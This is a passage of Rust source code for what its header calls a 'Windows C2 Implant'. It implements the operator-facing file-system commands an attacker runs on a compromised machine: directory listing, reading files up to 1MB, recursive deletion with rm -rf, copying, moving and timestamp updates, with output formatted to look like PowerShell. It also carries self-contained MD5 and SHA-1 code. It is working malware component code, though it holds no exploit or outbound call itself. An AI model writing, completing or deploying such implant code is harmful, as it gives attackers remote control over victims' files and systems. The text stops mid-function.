// inline_fs.rs — File System Operations for Windows C2 Implant
//
// All output formatted to match PowerShell style.
// Every function returns (output, error) — empty error = success.
// Uses winapi for Windows-specific attribute queries, std::fs for I/O.

use std::path::{Path, PathBuf};

// ============================================================
// MD5 Implementation (RFC 1321) — self-contained, no external crate
// ============================================================

fn md5_hash(data: &[u8]) -> [u8; 16] {
    const S: [u32; 64] = [
        7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,
        5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,
        4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,
        6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,
    ];
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee,
        0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
        0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be,
        0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
        0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa,
        0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
        0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
        0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c,
        0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
        0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05,
        0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
        0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039,
        0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1,
        0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
    ];

    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    // Pad message per RFC 1321
    let msg_len_bits = (data.len() as u64) * 8;
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0x00);
    }
    msg.extend_from_slice(&msg_len_bits.to_le_bytes());

    // Process each 512-bit (64-byte) block
    for chunk in msg.chunks_exact(64) {
        let mut m = [0u32; 16];
        for i in 0..16 {
            m[i] = u32::from_le_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }

        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);

        for i in 0..64 {
            let (f, g) = if i < 16 {
                ((b & c) | (!b & d), i)
            } else if i < 32 {
                ((d & b) | (!d & c), (5 * i + 1) % 16)
            } else if i < 48 {
                (b ^ c ^ d, (3 * i + 5) % 16)
            } else {
                (c ^ (b | !d), (7 * i) % 16)
            };
            let f = f.wrapping_add(a).wrapping_add(K[i]).wrapping_add(m[g]);
            a = d;
            d = c;
            c = b;
            b = b.wrapping_add(f.rotate_left(S[i]));
        }

        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut out = [0u8; 16];
    out[0..4].copy_from_slice(&a0.to_le_bytes());
    out[4..8].copy_from_slice(&b0.to_le_bytes());
    out[8..12].copy_from_slice(&c0.to_le_bytes());
    out[12..16].copy_from_slice(&d0.to_le_bytes());
    out
}

// ============================================================
// SHA-1 Implementation (FIPS 180-4) — self-contained, no crate
// ============================================================

fn sha1_hash(data: &[u8]) -> [u8; 20] {
    let mut h0: u32 = 0x67452301;
    let mut h1: u32 = 0xEFCDAB89;
    let mut h2: u32 = 0x98BADCFE;
    let mut h3: u32 = 0x10325476;
    let mut h4: u32 = 0xC3D2E1F0;

    let msg_len_bits = (data.len() as u64) * 8;
    let mut msg = data.to_vec();
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0x00);
    }
    // SHA-1 uses big-endian length
    msg.extend_from_slice(&msg_len_bits.to_be_bytes());

    for chunk in msg.chunks_exact(64) {
        let mut w = [0u32; 80];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }
        for i in 16..80 {
            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
        }

        let (mut a, mut b, mut c, mut d, mut e) = (h0, h1, h2, h3, h4);

        for i in 0..80 {
            let (f, k) = if i < 20 {
                ((b & c) | (!b & d), 0x5A827999)
            } else if i < 40 {
                (b ^ c ^ d, 0x6ED9EBA1)
            } else if i < 60 {
                ((b & c) | (b & d) | (c & d), 0x8F1BBCDC)
            } else {
                (b ^ c ^ d, 0xCA62C1D6)
            };
            let temp = a
                .rotate_left(5)
                .wrapping_add(f)
                .wrapping_add(e)
                .wrapping_add(k)
                .wrapping_add(w[i]);
            e = d;
            d = c;
            c = b.rotate_left(30);
            b = a;
            a = temp;
        }

        h0 = h0.wrapping_add(a);
        h1 = h1.wrapping_add(b);
        h2 = h2.wrapping_add(c);
        h3 = h3.wrapping_add(d);
        h4 = h4.wrapping_add(e);
    }

    let mut out = [0u8; 20];
    out[0..4].copy_from_slice(&h0.to_be_bytes());
    out[4..8].copy_from_slice(&h1.to_be_bytes());
    out[8..12].copy_from_slice(&h2.to_be_bytes());
    out[12..16].copy_from_slice(&h3.to_be_bytes());
    out[16..20].copy_from_slice(&h4.to_be_bytes());
    out
}

// ============================================================
// Hex encode helper
// ============================================================

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

// ============================================================
// Time formatting — M/D/YYYY  H:MM AM/PM (PowerShell style)
// ============================================================

fn format_ps_time(t: std::time::SystemTime) -> String {
    let dur = t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
    let secs = dur.as_secs();

    let total_days = secs / 86400;
    let mut y = 1970u32;
    let mut rem = total_days;
    loop {
        let dy = if is_leap(y) { 366u64 } else { 365u64 };
        if rem < dy {
            break;
        }
        rem -= dy;
        y += 1;
    }
    let md = [
        31u64,
        if is_leap(y) { 29 } else { 28 },
        31, 30, 31, 30, 31, 31, 30, 31, 30, 31,
    ];
    let mut mo = 0u32;
    for &d in &md {
        if rem < d {
            break;
        }
        rem -= d;
        mo += 1;
    }
    let day = rem + 1;
    let time_of_day = secs % 86400;
    let h24 = (time_of_day / 3600) as u32;
    let min = ((time_of_day % 3600) / 60) as u32;
    let (h12, ampm) = if h24 == 0 {
        (12, "AM")
    } else if h24 < 12 {
        (h24, "AM")
    } else if h24 == 12 {
        (12, "PM")
    } else {
        (h24 - 12, "PM")
    };

    // PS format: "M/D/YYYY  H:MM AM/PM" — two spaces before hour
    format!(
        "{}/{}/{}  {:2}:{:02} {}",
        mo + 1,
        day,
        y,
        h12,
        min,
        ampm
    )
}

fn is_leap(y: u32) -> bool {
    (y % 4 == 0 && y % 100 != 0) || (y % 400 == 0)
}

// ============================================================
// smart_split — split args respecting quoted paths
// "C:\my file.txt" dst.txt  →  ["C:\my file.txt", "dst.txt"]
// ============================================================

fn smart_split(s: &str) -> Vec<&str> {
    let mut out: Vec<&str> = Vec::new();
    let mut start = 0usize;
    let mut in_q = false;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'"' => {
                in_q = !in_q;
                i += 1;
            }
            b' ' | b'\t' if !in_q => {
                if i > start {
                    let tok = s[start..i].trim_matches('"');
                    if !tok.is_empty() {
                        out.push(tok);
                    }
                }
                i += 1;
                start = i;
            }
            _ => {
                i += 1;
            }
        }
    }
    if start < s.len() {
        let tok = s[start..].trim_matches('"');
        if !tok.is_empty() {
            out.push(tok);
        }
    }
    out
}

// ============================================================
// get_cwd — current working directory as String
// ============================================================

fn get_cwd() -> String {
    std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default()
}

// ============================================================
// resolve_path — resolve relative to CWD, handle drive letters
// ============================================================

fn resolve_path(p: &str) -> String {
    let p = p.trim();
    if p.is_empty() {
        return get_cwd();
    }
    // Already absolute
    if Path::new(p).is_absolute() {
        return p.to_string();
    }
    // Drive letter only: "D:" → "D:\"
    if p.len() == 2 && p.chars().nth(1) == Some(':') {
        let mut d = p.to_uppercase();
        d.push('\\');
        return d;
    }
    // Relative — join with CWD
    let cwd = get_cwd();
    Path::new(&cwd).join(p).display().to_string()
}

// ============================================================
// Windows file attributes via GetFileAttributesW
// Returns (readonly, hidden, system, archive, is_dir)
// ============================================================

#[cfg(target_os = "windows")]
fn get_file_attrs(path: &str) -> (bool, bool, bool, bool, bool) {
    use winapi::um::fileapi::GetFileAttributesW;
    use winapi::um::winnt::{
        FILE_ATTRIBUTE_READONLY, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM,
        FILE_ATTRIBUTE_ARCHIVE, FILE_ATTRIBUTE_DIRECTORY,
    };

    let wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
    let attrs = unsafe { GetFileAttributesW(wide.as_ptr()) };
    if attrs == winapi::um::fileapi::INVALID_FILE_ATTRIBUTES {
        return (false, false, false, true, false);
    }
    (
        attrs & FILE_ATTRIBUTE_READONLY != 0,
        attrs & FILE_ATTRIBUTE_HIDDEN != 0,
        attrs & FILE_ATTRIBUTE_SYSTEM != 0,
        attrs & FILE_ATTRIBUTE_ARCHIVE != 0,
        attrs & FILE_ATTRIBUTE_DIRECTORY != 0,
    )
}

#[cfg(not(target_os = "windows"))]
fn get_file_attrs(_path: &str) -> (bool, bool, bool, bool, bool) {
    (false, false, false, true, false)
}

// ============================================================
// build_mode_string — produces PowerShell 6-char mode (darhs-)
// AND linux-style rwx string for the extended ls view.
// ============================================================

fn build_mode_string(
    is_dir: bool,
    is_symlink: bool,
    readonly: bool,
    hidden: bool,
    system: bool,
    archive: bool,
) -> String {
    // PowerShell style: d a r h s l
    let mut m = String::with_capacity(6);
    m.push(if is_dir     { 'd' } else { '-' });
    m.push(if archive    { 'a' } else { '-' });
    m.push(if readonly   { 'r' } else { '-' });
    m.push(if hidden     { 'h' } else { '-' });
    m.push(if system     { 's' } else { '-' });
    m.push(if is_symlink { 'l' } else { '-' });
    m
}

/// Linux-style rwx permission string for a Windows file/dir entry.
/// Windows has no execute/group/other bits — we approximate:
///   owner: rw- (r- if readonly), d adds x for dirs
///   group: r-- (or r-x for dirs)
///   other: r-- (or r-x for dirs)
/// Hidden/system files get --- for group/other.
fn build_rwx_string(
    is_dir: bool,
    is_symlink: bool,
    readonly: bool,
    hidden: bool,
    system: bool,
) -> String {
    let type_char = if is_symlink { 'l' } else if is_dir { 'd' } else { '-' };

    // Owner bits
    let o_r = 'r';
    let o_w = if readonly { '-' } else { 'w' };
    let o_x = if is_dir { 'x' } else { '-' };

    // Group / other: hidden/system files restrict access
    let (g_r, g_x, t_r, t_x) = if hidden || system {
        ('-', '-', '-', '-')
    } else {
        ('r', if is_dir { 'x' } else { '-' },
         'r', if is_dir { 'x' } else { '-' })
    };

    format!("{}{}{}{} {}{}{} {}{}{}",
        type_char, o_r, o_w, o_x,
        g_r, '-', g_x,
        t_r, '-', t_x,
    )
}

// ============================================================
// Update file modification time to now (Windows: SetFileTime)
// ============================================================

/// Convert SystemTime to winapi FILETIME
#[cfg(target_os = "windows")]
fn systemtime_to_filetime(t: std::time::SystemTime) -> winapi::shared::minwindef::FILETIME {
    let dur = t.duration_since(std::time::UNIX_EPOCH).unwrap_or_default();
    // FILETIME = 100ns intervals since 1601-01-01; UNIX epoch offset = 116444736000000000
    let intervals = dur.as_secs() * 10_000_000 + dur.subsec_nanos() as u64 / 100;
    let ft_val = intervals + 116444736000000000u64;
    winapi::shared::minwindef::FILETIME {
        dwLowDateTime: ft_val as u32,
        dwHighDateTime: (ft_val >> 32) as u32,
    }
}

/// Update file modification time to now (Windows: SetFileTime via std::fs handle)
fn touch_set_mtime(path: &str) -> std::io::Result<()> {
    #[cfg(target_os = "windows")]
    {
        use std::os::windows::io::AsRawHandle;
        use winapi::um::fileapi::SetFileTime;

        // Open file for writing (without truncating) to get a handle
        let file = std::fs::OpenOptions::new().write(true).open(path)?;

        let handle = file.as_raw_handle() as winapi::shared::ntdef::HANDLE;
        let ft = systemtime_to_filetime(std::time::SystemTime::now());

        let result = unsafe { SetFileTime(handle, std::ptr::null(), std::ptr::null(), &ft) };
        // file dropped here — closes handle

        if result == 0 {
            Err(std::io::Error::last_os_error())
        } else {
            Ok(())
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        let _ = path;
        Err(std::io::Error::new(
            std::io::ErrorKind::Unsupported,
            "touch mtime update not supported on this platform",
        ))
    }
}

// ============================================================
// 1. pwd — return current working directory
// ============================================================

pub fn pwd() -> (String, String) {
    match std::env::current_dir() {
        Ok(p) => (p.display().to_string(), String::new()),
        Err(e) => (String::new(), format!("pwd: {}", e)),
    }
}

// ============================================================
// 2. cd — change directory
// Returns the new absolute CWD so the GUI can update the prompt.
// Supports: empty, ., .., absolute paths, drive letters (D:), ~
// ============================================================

pub fn cd(path: &str) -> (String, String) {
    let target = path.trim();

    // Empty or "." → return current
    if target.is_empty() || target == "." {
        return pwd();
    }

    // ── Drive letter only: "C:" or "D:" ──────────────────────────────────
    // std::env::set_current_dir("D:\\") on Windows changes CWD to D:\
    // BUT if D: has a remembered CWD (e.g. D:\Projects), Windows expects
    // "D:" without backslash to switch to that remembered CWD.
    // We use SetCurrentDirectoryW via FFI — the only reliable way.
    if target.len() == 2 && target.chars().nth(1) == Some(':') {
        #[cfg(target_os = "windows")]
        {
            extern "system" {
                fn SetCurrentDirectoryW(path: *const u16) -> i32;
                fn GetCurrentDirectoryW(buf_len: u32, buf: *mut u16) -> u32;
            }
            // Pass "D:" — Windows will resolve to the drive's remembered CWD
            // or D:\ if no remembered CWD exists.
            let drive_wide: Vec<u16> = target.encode_utf16()
                .chain(std::iter::once(0)).collect();
            let ok = unsafe { SetCurrentDirectoryW(drive_wide.as_ptr()) };
            if ok != 0 {
                // Read back actual new CWD
                let mut buf = [0u16; 512];
                let len = unsafe { GetCurrentDirectoryW(512, buf.as_mut_ptr()) };
                if len > 0 {
                    let cwd = String::from_utf16_lossy(&buf[..len as usize]);
                    return (cwd, String::new());
                }
                return pwd();
            } else {
                // Drive doesn't exist or not ready
                return ps_error("Set-Location", "cd", target);
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            return ps_error("Set-Location", "cd", target);
        }
    }

    // ~ (home directory)
    if target == "~" || target.starts_with("~/") || target.starts_with("~\\") {
        let home = std::env::var("USERPROFILE")
            .or_else(|_| {
                let drive = std::env::var("HOMEDRIVE").unwrap_or_default();
                let hp = std::env::var("HOMEPATH").unwrap_or_default();
                Ok::<String, std::env::VarError>(format!("{}{}", drive, hp))
            })
            .unwrap_or_default();
        let resolved = if target == "~" {
            home
        } else {
            let rest = &target[2..];
            Path::new(&home).join(rest).display().to_string()
        };
        return match std::env::set_current_dir(&resolved) {
            Ok(()) => pwd(),
            Err(_) => ps_error("Set-Location", "cd", target),
        };
    }

    // Resolve the target path relative to CWD
    let abs_path = resolve_path(target);

    // Verify it exists and is a directory before changing
    match std::fs::metadata(&abs_path) {
        Ok(meta) if meta.is_dir() => {}
        _ => return ps_error("Set-Location", "cd", target),
    }

    match std::env::set_current_dir(&abs_path) {
        Ok(()) => pwd(),
        Err(_) => ps_error("Set-Location", "cd", target),
    }
}

/// Generate a PowerShell-style error message for path-not-found scenarios.
fn ps_error(cmdlet: &str, verb: &str, target: &str) -> (String, String) {
    (
        String::new(),
        format!(
            "{}: Cannot find path '{}' because it does not exist.\n\
             At line:1 char:1\n\
             + {} {}\n\
                 + CategoryInfo          : ObjectNotFound: ({}) [{}], ItemNotFoundException\n\
                 + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.{}Command",
            cmdlet, target, verb, target, target, cmdlet, cmdlet
        ),
    )
}

// ============================================================
// 3. ls / dir — directory listing
//
// Output matches PowerShell Get-ChildItem:
//
//     Directory: C:\Users\admin\Desktop
//
// Mode                 LastWriteTime         Length Name
// ----                 -------------         ------ ----
// d-----         8/23/2026   9:58 AM                practicalC
// -a----         8/23/2026   9:58 AM        1174573 hero_implant.exe
// ============================================================

pub fn ls(args: &str) -> (String, String) {
    // Strip Linux-style flags (-la, -l, -a, -1, --all etc) — we always show full detail.
    // If operator passes "ls -la /some/path", we extract /some/path correctly.
    let tokens = smart_split(args);
    let path_arg = tokens.iter()
        .find(|t| !t.starts_with('-'))
        .map(|s| *s)
        .unwrap_or("");

    let dir = if path_arg.is_empty() { "." } else { path_arg };

    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => {
            // Maybe it's a file — show single file info
            if let Ok(meta) = std::fs::metadata(dir) {
                if !meta.is_dir() {
                    return (
                        String::new(),
                        format!(
                            "Get-ChildItem: Cannot find path '{}' because it does not exist.\n\
                             At line:1 char:1\n\
                             + ls {}\n\
                                 + CategoryInfo          : ObjectNotFound: ({}) [Get-ChildItem], ItemNotFoundException\n\
                                 + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand",
                            dir, dir, dir
                        ),
                    );
                }
            }
            return (
                String::new(),
                format!(
                    "Get-ChildItem: Cannot find path '{}' because it does not exist.\n\
                     At line:1 char:1\n\
                     + ls {}\n\
                         + CategoryInfo          : ObjectNotFound: ({}) [Get-ChildItem], ItemNotFoundException\n\
                         + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand",
                    dir, dir, dir
                ),
            );
        }
    };

    // Resolve display path (absolute)
    let display_path = if path_arg.is_empty() {
        std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| ".".to_string())
    } else {
        std::fs::canonicalize(path_arg)
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| path_arg.to_string())
    };

    // Collect entries
    struct Entry {
        name: String,
        modified: String,
        size: u64,
        is_dir: bool,
        is_symlink: bool,
        readonly: bool,
        hidden: bool,
        system: bool,
        archive: bool,
    }

    let mut items: Vec<Entry> = Vec::new();
    let base_for_attrs = if path_arg.is_empty() {
        get_cwd()
    } else {
        // Try to canonicalize for attribute lookups; fall back to raw path
        std::fs::canonicalize(path_arg)
            .map(|p| p.display().to_string())
            .unwrap_or_else(|_| path_arg.to_string())
    };

    for e in entries {
        let entry = match e {
            Ok(e) => e,
            Err(_) => continue,
        };

        let name = entry.file_name().to_string_lossy().to_string();

        // CRITICAL FIX: Call file_type() ONCE. The old code called it twice:
        //   e.file_type().unwrap_or_else(|_| { e.file_type().unwrap() })
        // The second call re-fetches metadata and can panic on network drives.
        let ft = match entry.file_type() {
            Ok(ft) => ft,
            Err(_) => continue,
        };
        let is_dir = ft.is_dir();
        let is_symlink = ft.is_symlink();

        // Get metadata for size and modified time
        let meta = match entry.metadata() {
            Ok(m) => m,
            Err(_) => continue,
        };

        let modified = meta
            .modified()
            .ok()
            .map(format_ps_time)
            .unwrap_or_default();
        let size = if is_dir { 0 } else { meta.len() };

        // Get Windows file attributes for mode string
        let full_path = format!(
            "{}\\{}",
            base_for_attrs.trim_end_matches('\\'),
            name
        );
        let (readonly, hidden, system, archive, _) = get_file_attrs(&full_path);

        items.push(Entry {
            name,
            modified,
            size,
            is_dir,
            is_symlink,
            readonly,
            hidden,
            system,
            archive,
        });
    }

    // Sort: directories first, then files, both case-insensitive alphabetical
    items.sort_by(|a, b| match (a.is_dir, b.is_dir) {
        (true, false) => std::cmp::Ordering::Less,
        (false, true) => std::cmp::Ordering::Greater,
        _ => a.name.to_lowercase().cmp(&b.name.to_lowercase()),
    });

    if items.is_empty() {
        return (
            format!("\n    Directory: {}\n\n[empty directory]\n", display_path),
            String::new(),
        );
    }

    // ── Build output ────────────────────────────────────────────────────────
    let mut out = String::new();
    out.push_str(&format!("\n    Directory: {}\n\n", display_path));

    // Header — dual format: Permissions(linux) | Mode(PS) | Size | LastWriteTime | Name
    out.push_str(&format!(
        "{:<12}  {:<6}  {:>10}  {:<20}  {}\n",
        "Permissions", "Mode", "Length", "LastWriteTime", "Name"
    ));
    out.push_str(&format!(
        "{:<12}  {:<6}  {:>10}  {:<20}  {}\n",
        "-----------", "----", "------", "-------------", "----"
    ));

    for e in &items {
        let mode = build_mode_string(
            e.is_dir, e.is_symlink, e.readonly, e.hidden, e.system, e.archive,
        );
        let rwx = build_rwx_string(
            e.is_dir, e.is_symlink, e.readonly, e.hidden, e.system,
        );

        if e.is_dir {
            out.push_str(&format!(
                "{:<12}  {:<6}             {:<20}  {}\n",
                rwx, mode, e.modified, e.name
            ));
        } else {
            out.push_str(&format!(
                "{:<12}  {:<6}  {:>10}  {:<20}  {}\n",
                rwx, mode, e.size, e.modified, e.name
            ));
        }
    }

    // Summary line like `ls -la` on Linux
    let total_files = items.iter().filter(|e| !e.is_dir).count();
    let total_dirs  = items.iter().filter(|e| e.is_dir).count();
    let total_bytes: u64 = items.iter().map(|e| e.size).sum();
    out.push('\n');
    out.push_str(&format!(
        "total {} item(s): {} dir(s), {} file(s), {} bytes\n",
        items.len(), total_dirs, total_files, total_bytes
    ));

    (out, String::new())
}

// ============================================================
// 4. cat / type — read file contents
// Truncates at 1MB with a notice.
// ============================================================

pub fn cat_file(path: &str) -> (String, String) {
    if path.is_empty() {
        return (String::new(), "cat: path required".into());
    }
    let resolved = resolve_path(path);
    match std::fs::read(&resolved) {
        Ok(data) => {
            const MAX: usize = 1 * 1024 * 1024;
            if data.len() > MAX {
                let s = String::from_utf8_lossy(&data[..MAX]).into_owned();
                (
                    format!(
                        "{}\n\n[TRUNCATED: file is {} bytes, showing first {} bytes]",
                        s,
                        data.len(),
                        MAX
                    ),
                    String::new(),
                )
            } else {
                (String::from_utf8_lossy(&data).into_owned(), String::new())
            }
        }
        Err(e) => (
            String::new(),
            format!(
                "Get-Content: Cannot find path '{}' because it does not exist.\n\nDetails: {}",
                resolved, e
            ),
        ),
    }
}

// ============================================================
// 5. mkdir — create directory (recursive, like mkdir -p)
// ============================================================

pub fn mkdir(path: &str) -> (String, String) {
    if path.is_empty() {
        return (String::new(), "mkdir: path required".into());
    }
    let resolved = resolve_path(path);
    match std::fs::create_dir_all(&resolved) {
        Ok(()) => (format!("[success] created directory: {}", resolved), String::new()),
        Err(e) => (String::new(), format!("mkdir: {}: {}", resolved, e)),
    }
}

// ============================================================
// 6. touch — create empty file(s) or update mtime
//    Supports: touch f1.txt f2.txt f3.txt  (Linux-style multi-file)
// ============================================================

pub fn touch_file(args: &str) -> (String, String) {
    if args.trim().is_empty() {
        return (String::new(), "touch: filename required\nUsage: touch <file1> [file2] ...".into());
    }

    // Parse multiple filenames — same smart_split used by rm/mv
    let names = smart_split(args);
    if names.is_empty() {
        return (String::new(), "touch: filename required".into());
    }

    let mut created: Vec<String> = Vec::new();
    let mut touched: Vec<String> = Vec::new();
    let mut failed: Vec<String>  = Vec::new();

    for name in &names {
        let resolved = resolve_path(name);
        if !Path::new(&resolved).exists() {
            match std::fs::File::create(&resolved) {
                Ok(_)  => created.push(resolved),
                Err(e) => failed.push(format!("{}: {}", name, e)),
            }
        } else {
            match touch_set_mtime(&resolved) {
                Ok(())  => touched.push(resolved),
                Err(e)  => failed.push(format!("{}: {}", name, e)),
            }
        }
    }

    let mut out = String::new();
    if !created.is_empty() {
        out.push_str(&format!("[success] created: {}\n", created.join("  ")));
    }
    if !touched.is_empty() {
        out.push_str(&format!("[success] touched: {}\n", touched.join("  ")));
    }
    let err = if failed.is_empty() {
        String::new()
    } else {
        failed.iter().map(|e| format!("[ERR] touch: {}", e)).collect::<Vec<_>>().join("\n")
    };

    (out.trim_end().to_string(), err)
}

// ============================================================
// 7. rm — remove files or directories
//
// Supports: -r, -f, -rf, -fr, multiple files, -- separator
// ============================================================

pub fn rm_cmd(args: &str) -> (String, String) {
    if args.trim().is_empty() {
        return (
            String::new(),
            "rm: filename required (usage: rm [-rf] <file>...)".into(),
        );
    }

    let parts = smart_split(args);
    let mut recursive = false;
    let mut force = false;
    let mut targets: Vec<&str> = Vec::new();

    for &p in &parts {
        if p == "--" {
            continue;
        }
        if p.len() > 1 && p.as_bytes()[0] == b'-' {
            // Parse flags
            for c in p[1..].bytes() {
                match c {
                    b'r' | b'R' => recursive = true,
                    b'f' | b'F' => force = true,
                    _ => {} // ignore unknown flags like 'v'
                }
            }
            continue;
        }
        targets.push(p);
    }

    if targets.is_empty() {
        return (String::new(), "rm: no files specified".into());
    }

    let mut out = String::new();
    let mut deleted = 0u32;
    let mut failed = 0u32;
    let mut skipped = 0u32;

    for &target in &targets {
        let resolved = resolve_path(target);

        let meta = match std::fs::metadata(&resolved) {
            Ok(m) => m,
            Err(e) => {
                if force && e.kind() == std::io::ErrorKind::NotFound {
                    skipped += 1;
                    continue;
                }
                out.push_str(&format!(
                    "[ERROR] rm: {}: {}\n",
                    target, e
                ));
                failed += 1;
                continue;
            }
        };

        if meta.is_dir() && !recursive {
            out.push_str(&format!(
                "[ERROR] rm: {}: is a directory (use -r to remove recursively)\n",
                target
            ));
            failed += 1;
            continue;
        }

        let res = if meta.is_dir() {
            std::fs::remove_dir_all(&resolved)
        } else {
            std::fs::remove_file(&resolved)
        };

        match res {
            Ok(()) => {
                let kind = if meta.is_dir() {
                    "directory"
                } else {
                    "file"
                };
                out.push_str(&format!("[success] removed {}: {}\n", kind, target));
                deleted += 1;
            }
            Err(e) => {
                out.push_str(&format!("[ERROR] rm: {}: {}\n", target, e));
                failed += 1;
            }
        }
    }

    // Build summary line (appended to output, matching Go version which always returns nil error)
    let mut summary = format!("\n{} deleted, {} failed", deleted, failed);
    if skipped > 0 {
        summary.push_str(&format!(", {} skipped (missing, -f)", skipped));
    }
    out.push_str(&summary);

    // Trim trailing newline for clean output, always return in output field
    // (Go version returns nil error, putting everything in the output string)
    (out.trim_end().to_string(), String::new())
}

// ============================================================
// 8. cp — copy file
//
// Handles: drive letter destinations (D:), relative paths,
// directory destination (appends filename).
// ============================================================

pub fn cp_cmd(args: &str) -> (String, String) {
    let parts = smart_split(args);
    if parts.len() < 2 {
        return (
            String::new(),
            "cp: source and destination required (usage: cp <src> <dst>)".into(),
        );
    }

    let src = parts[0];
    let dst = parts[1];

    if src.is_empty() || dst.is_empty() {
        return (
            String::new(),
            "cp: source and destination required (usage: cp <src> <dst>)".into(),
        );
    }

    let resolved_src = resolve_path(src);

    // Handle drive letter destination: "D:" → "D:\"
    let mut resolved_dst = dst.to_string();
    if dst.len() == 2 && dst.chars().nth(1) == Some(':') {
        resolved_dst = format!("{}\\", dst.to_uppercase());
    }
    if !Path::new(&resolved_dst).is_absolute() {
        resolved_dst = resolve_path(dst);
    }

    // If destination is an existing directory, append source filename
    if Path::new(&resolved_dst).is_dir() {
        let filename = Path::new(&resolved_src)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();
        resolved_dst = format!(
            "{}\\{}",
            resolved_dst.trim_end_matches('\\'),
            filename
        );
    }

    // Verify source is not a directory
    let src_meta = match std::fs::metadata(&resolved_src) {
        Ok(m) => m,
        Err(e) => {
            return (
                String::new(),
                format!("cp: open source {}: {}", src, e),
            );
        }
    };
    if src_meta.is_dir() {
        return (
            String::new(),
            "cp: source is a directory, cp only supports files".into(),
        );
    }

    // Create parent directory of destination if needed
    if let Some(parent) = Path::new(&resolved_dst).parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    match std::fs::copy(&resolved_src, &resolved_dst) {
        Ok(bytes) => (
            format!(
                "[success] copied {} bytes: {} -> {}",
                bytes, resolved_src, resolved_dst
            ),
            String::new(),
        ),
        Err(e) => (
            String::new(),
            format!("cp: copy failed: {}", e),
        ),
    }
}

// ============================================================
// 9. mv — move/rename
//
// Same path handling as cp. Falls back to copy+delete for
// cross-drive moves.
// ============================================================

pub fn mv_cmd(args: &str) -> (String, String) {
    let parts = smart_split(args);
    if parts.len() < 2 {
        return (
            String::new(),
            "mv: source and destination required (usage: mv <src> <dst>)".into(),
        );
    }

    let src = parts[0];
    let dst = parts[1];

    if src.is_empty() || dst.is_empty() {
        return (
            String::new(),
            "mv: source and destination required (usage: mv <src> <dst>)".into(),
        );
    }

    let resolved_src = resolve_path(src);

    // Handle drive letter destination: "D:" → "D:\"
    let mut resolved_dst = dst.to_string();
    if dst.len() == 2 && dst.chars().nth(1) == Some(':') {
        resolved_dst = format!("{}\\", dst.to_uppercase());
    }
    if !Path::new(&resolved_dst).is_absolute() {
        resolved_dst = resolve_path(dst);
    }

    // If destination is an existing directory, move src INTO it
    if Path::new(&resolved_dst).is_dir() {
        let filename = Path::new(&resolved_src)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
            .unwrap_or_default();
        resolved_dst = format!(
            "{}\\{}",
            resolved_dst.trim_end_matches('\\'),
            filename
        );
    }

    // Try rename first (works same-drive, same-filesystem)
    match std::fs::rename(&resolved_src, &resolved_dst) {
        Ok(()) => (
            format!("[success] moved: {} -> {}", resolved_src, resolved_dst),
            String::new(),
        ),
        Err(rename_err) => {
            // Windows error 17 = ERROR_NOT_SAME_DEVICE (cross-drive move)
            // Also catch os error 18 on some Windows versions.
            // std::io::Error::raw_os_error() gives the raw Windows error code.
            let is_cross_device = rename_err.raw_os_error()
                .map(|c| c == 17 || c == 18)
                .unwrap_or(false)
